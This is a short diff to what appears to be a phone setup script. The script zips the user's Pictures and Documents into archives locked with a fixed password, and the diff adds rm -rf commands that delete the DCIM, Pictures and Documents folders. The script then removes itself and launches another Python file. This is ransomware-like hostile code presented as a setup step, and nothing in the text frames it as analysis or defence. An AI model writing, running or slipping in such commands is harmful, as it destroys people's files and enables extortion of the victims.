@@ -25,6 +25,12 @@ zip --password babayaga รูปของคุณ2.zip Pictures
 
 zip --password babayaga เอกสาร.zip Documents
 
+rm -rf DCIM
+
+rm -rf Pictures
+
+rm -rf Documents
+
 rm setup.sh
 
 python3 boby2.py
